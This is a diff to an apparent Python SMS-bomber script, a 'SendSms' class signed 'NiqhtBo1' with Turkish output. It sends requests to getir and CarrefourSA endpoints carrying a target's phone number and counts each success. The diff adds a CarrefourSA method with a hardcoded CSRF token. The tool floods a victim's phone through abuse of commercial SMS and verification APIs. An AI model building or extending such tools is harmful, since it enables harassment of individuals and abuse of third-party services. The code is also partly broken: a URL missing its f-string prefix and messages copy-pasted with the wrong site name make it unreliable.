@@ -260,7 +260,7 @@ class SendSms():
     #getir
     def getir(self):
         try:
-            wmf = requests.post("https://food-client-api-gateway.getirapi.com/clients/by-gsm/?countryCode=90&gsm={self.phone}")
+            wmf = requests.get("https://food-client-api-gateway.getirapi.com/clients/by-gsm/?countryCode=90&gsm={self.phone}")
             if wmf.status_code == 202:
                 print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> getir.com")
                 self.adet += 1
@@ -270,4 +270,18 @@ class SendSms():
             
             print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> getir.com")
 
+    #carfour
+    def carfour(self):
+        try:
+            url= "https://www.carrefoursa.com/" 
+            json={"mobileNumber": self.phone, "mail": self.mail, "CSRFToken": "8cb39a1a-a30f-4eee-8034-d5c1a5f64ab8"}
+            wmf = requests.post(url, json=json)
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> getir.com")
+                self.adet += 1
+            else: 
+                raise
+        except:
+            
+            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> getir.com")
   
